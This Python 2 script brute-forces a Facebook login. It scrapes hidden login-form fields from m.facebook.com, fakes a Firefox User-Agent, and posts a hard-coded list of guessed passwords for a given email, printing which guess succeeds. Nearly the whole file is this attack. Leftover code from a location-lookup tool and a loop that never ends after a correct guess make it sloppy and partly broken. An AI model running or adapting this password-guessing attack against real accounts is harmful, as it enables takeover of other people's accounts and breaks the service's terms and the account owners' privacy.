import sys
import re

try:
    import requests

except ImportError:
    print "[!] Couldn't import requests"
    sys.exit()

if len(sys.argv) < 3:
    print "Usage: get_location.py target_username my_fb_emaild"
    print "Example get_location.py user.name user@gmail.com"
    sys.exit()

user = sys.argv[1]
username = sys.argv[2]

def get_graphID_user(s, username):
    """Get the Facebook graph api id from a user"""
    r = s.get("https://m.facebook.com/{user}".format(user=username))
    print (r)
    match = re.search(r'photo.php\?fbid=\d*&amp;id=(\d*)&', r.text)
    if match:
        graph_id = match.group(1)
        return graph_id
    else:
        return False

# Create session, and set the User-Agent
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"


contador_prueba=0

# Retrieve the right parameters for the login
data = requests.get("https://m.facebook.com/").text
params = {'lsd': None, 'm_ts': None, 'pxr': None, 'li': None, 'width': None, 'ajax': None, 'version': None, 'gps': None, 'charset_test': None}
for p in params.keys():
    match = re.search(r'name="place_holder" value="(.*?)"'.replace("place_holder", p), data)
    if match:
        params[p] = match.group(1)

# Set the important parameters

prueba=['admin','123','santin','123','prueba1','prueba2','12345678','prueba1','prueba2','prueba3',
        'prueba4','prueba5','prueba6','prueba7','prueba8','prueba9','prueba10','walter','losamo2013a','prueba13',
        'prueba14']
contador=0
while (contador <21 ):
	params['email'] = username
	params['pass'] = prueba[contador]
	params['login'] = 'Log In'

	if contador==2:
            contador_prueba=0
            print ("Llego a contador")

	r = s.post(r"https://m.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8", data=params)

	if '/recover/initiate/' in r.text:
	    print (prueba[contador],": Login Incorrecto!")
	    contador+=1
	else:
	    print (prueba[contador],": Login Correcto!")
